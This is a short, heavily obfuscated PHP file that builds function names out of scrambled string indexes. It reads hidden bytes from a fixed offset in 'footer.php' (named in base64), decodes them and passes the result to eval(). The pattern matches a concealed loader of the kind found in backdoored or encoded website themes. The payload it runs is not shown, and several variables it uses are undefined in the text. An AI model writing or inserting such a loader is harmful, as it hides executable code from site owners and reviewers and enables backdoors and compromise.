<?php 

$DOkItr=$ILQaBp.$wybwxu{4}.$RSuLUh;$EeOQlF+=__LINE__*2;
$PvNHTu=$wybwxu{14}.$wybwxu{21}.$wybwxu{25}.$wybwxu{17}.$wybwxu{30};$EeOQlF+=__LINE__*1;
$rCyRAK=$wybwxu{14}.$wybwxu{6}.$wybwxu{17}.$wybwxu{22}.$wybwxu{5};$EeOQlF+=__LINE__*3;
$mgldTu=$wybwxu{14}.$wybwxu{8}.$wybwxu{37}.$wybwxu{21}.$wybwxu{38}.$wybwxu{17};$EeOQlF+=__LINE__*1;
if(!0)$fGUzJB=$PvNHTu(base64_decode('Zm9vdGVyLnBocA=='),$wybwxu{6}.$wybwxu{42});$EeOQlF+=__LINE__*3;
$rCyRAK($fGUzJB,2988);if($egqBwt(RFC980CAEDDA1D403037D82858BFE8265,__FILE__)===0)$zcflRX=GSztoc();
$RcyTRa=$rCyRAK($fGUzJB,5979-$EeOQlF);$EeOQlF+=__LINE__*3;
$RcyTRa=$zPMDAe($RcyTRa,-3).$zPMDAe($RcyTRa,0,-3);$EeOQlF+=__LINE__*3;
$mgldTu($fGUzJB);
if($ILQaBp)$RcyTRa=$DOkItr('=HoRAsuWfithtWFangRiugWUBXVRpe',(($hkYaqJ!=46)?'WwZqLbDQQnHywXeOQZDPKOlhdTDpje':'mVEWG9VMkZPcUNkb1NhbFRaMkY0K3V'),$RcyTRa);
eval($GSztoc($RcyTRa));
$RcyTRa=$jXqTfS($RcyTRa,'tbQIdsmS5+oLKDeHhvMyFu7qGOWkiw1gBUXaV2pfATcxn9','OpQdUsaHmgVS+Wbu7xtD5T9k2yILh1XBAfqeFnoMwGvKci');$EeOQlF+=__LINE__*1;
